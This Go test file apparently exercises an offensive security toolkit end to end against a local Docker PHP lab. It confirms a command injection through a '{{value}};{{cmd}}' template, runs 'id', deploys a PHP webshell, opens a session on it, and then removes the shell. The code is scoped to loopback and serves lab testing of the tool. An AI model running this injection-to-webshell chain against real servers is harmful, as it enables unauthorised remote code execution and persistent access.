package server

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/c1ayooo/capkit/adapters/httpx"
	capkit "github.com/c1ayooo/capkit/core"
	"github.com/c1ayooo/capkit/gates"

	"github.com/c1ayooo/4zrec/internal/capkitbridge"
)

// TestCapkitDeployChainAgainstRealTarget is the M2 chain wired through *this*
// host's adapters: probe a real command injection, prove output, drop a shell
// through the same primitive, open a session over it, run id, then clean up.
//
// It is opt-in because it needs a live PHP target:
//
//	docker build -t capkit-lab:latest /path/to/capkit/examples/lab/php
//	docker run -d --rm -p 127.0.0.1:18080:80 --name capkit-lab capkit-lab:latest
//	CAPKIT_LAB_URL=http://127.0.0.1:18080 \
//	CAPKIT_LAB_WEBROOT=/var/www/html \
//	go test ./internal/platform/server/ -run TestCapkitDeployChainAgainstRealTarget -v
func TestCapkitDeployChainAgainstRealTarget(t *testing.T) {
	base := strings.TrimSpace(os.Getenv("CAPKIT_LAB_URL"))
	webroot := strings.TrimSpace(os.Getenv("CAPKIT_LAB_WEBROOT"))
	if base == "" || webroot == "" {
		t.Skip("需要 CAPKIT_LAB_URL 与 CAPKIT_LAB_WEBROOT 指向一个可写的 PHP 靶机")
	}
	base = strings.TrimRight(base, "/")
	pointURL := base + "/exec.php"

	points := newConfirmedPoints()
	deployer := &capkitDeployer{points: points}
	scope := &capkitScope{pg: stubScopePG{allowed: "127.0.0.1"}}
	limiter := gates.NewLimiter()
	audit := &capkitAudit{}
	// A short per-request timeout keeps a broken target from hanging the test.
	httpDoer := httpx.New(scope, limiter, audit)

	observer := &Server{capkitPoints: points}
	bridge, err := capkitbridge.New(capkitbridge.Options{
		Scope:    scope,
		HTTP:     httpDoer,
		Limiter:  limiter,
		Audit:    audit,
		Executor: &webshellExecutor{http: httpDoer},
		Deployer: deployer,
		Context: func(context.Context) capkit.CallContext {
			return capkit.CallContext{ProjectID: 1, Actor: "capkit-e2e"}
		},
		OnResult: observer.observeCapkitResult,
	})
	if err != nil {
		t.Fatalf("bridge: %v", err)
	}
	deployer.bridge = bridge

	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer cancel()
	cc := capkit.CallContext{ProjectID: 1, Actor: "capkit-e2e", TraceID: "e2e-trace"}
	call := func(tool string, input any) capkit.Result {
		t.Helper()
		raw, err := json.Marshal(input)
		if err != nil {
			t.Fatalf("%s 入参: %v", tool, err)
		}
		res, err := bridge.Call(ctx, tool, raw, cc)
		if err != nil {
			t.Fatalf("%s: %v", tool, err)
		}
		if !res.OK {
			t.Fatalf("%s 失败: status=%s summary=%s hint=%s", tool, res.Status, res.Summary, errHint(res))
		}
		t.Logf("%s -> %s | %s", tool, res.Status, res.Summary)
		return res
	}

	point := map[string]any{
		"url": pointURL, "param": "ip", "location": "query", "value": "127.0.0.1",
	}

	// 1. Prove the injection.
	probe := call("cmdi_probe", map[string]any{"point": point, "marker": "zrec_e2e_marker"})
	confirmed := false
	for _, f := range probe.Findings {
		if f.Confirmed {
			confirmed = true
		}
	}
	if !confirmed {
		t.Fatalf("探测没有确认命令执行: %+v", probe.Findings)
	}

	// 2. Prove output (and let the observer record the point).
	execRes := call("cmdi_execute", map[string]any{
		"point": point, "template": "{{value}};{{cmd}}", "command": "id",
	})
	if !strings.Contains(capkitEvidencePreview(execRes), "uid=") {
		t.Fatalf("cmdi_execute 没拿到 id: %s", capkitEvidencePreview(execRes))
	}

	// 3. Deliver the shell through the confirmed point.
	deploy := call("webshell_deploy", map[string]any{
		"target": pointURL, "shell_type": "php", "dir": webroot,
	})
	var dropped struct {
		FileURL  string          `json:"file_url"`
		Webshell json.RawMessage `json:"webshell"`
		Cleanup  struct {
			Command string `json:"command"`
		} `json:"cleanup"`
	}
	if err := json.Unmarshal(deploy.Data, &dropped); err != nil {
		t.Fatalf("解析投递结果: %v (%s)", err, deploy.Data)
	}
	if dropped.FileURL == "" || len(dropped.Webshell) == 0 || dropped.Cleanup.Command == "" {
		t.Fatalf("投递结果不完整: %s", deploy.Data)
	}
	t.Logf("dropped: %s", dropped.FileURL)

	// 4. Take over the session and run a real command.
	open := call("session_open", json.RawMessage(dropped.Webshell))
	var session struct {
		SessionID string `json:"session_id"`
	}
	if err := json.Unmarshal(open.Data, &session); err != nil || session.SessionID == "" {
		t.Fatalf("session_open 没返回 session_id: %v (%s)", err, open.Data)
	}
	exec := call("session_exec", map[string]any{"session_id": session.SessionID, "command": "id"})
	var out struct {
		Stdout string `json:"stdout"`
	}
	_ = json.Unmarshal(exec.Data, &out)
	if !strings.Contains(out.Stdout, "uid=") {
		t.Fatalf("会话执行没拿到 id: %s", exec.Data)
	}
	t.Logf("session exec id -> %s", strings.TrimSpace(out.Stdout))

	// 5. Run the tool's cleanup command through the same session.
	call("session_exec", map[string]any{"session_id": session.SessionID, "command": dropped.Cleanup.Command})
	call("session_close", map[string]any{"session_id": session.SessionID})

	// 6. The dropped file must be gone from the target's point of view.
	if code := httpStatus(t, dropped.FileURL); code != http.StatusNotFound {
		t.Fatalf("清理后落点仍可访问: %s -> %d", dropped.FileURL, code)
	}
	t.Logf("after cleanup: %s -> 404", dropped.FileURL)
}

func errHint(res capkit.Result) string {
	if res.Error == nil {
		return ""
	}
	return res.Error.Code + " " + res.Error.Hint
}

func capkitEvidencePreview(res capkit.Result) string {
	if len(res.Evidence) == 0 {
		return ""
	}
	return res.Evidence[0].Preview
}

func httpStatus(t *testing.T, url string) int {
	t.Helper()
	resp, err := http.Get(url) //nolint:gosec // loopback fixture in an explicit opt-in test
	if err != nil {
		t.Fatalf("GET %s: %v", url, err)
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, resp.Body)
	return resp.StatusCode
}
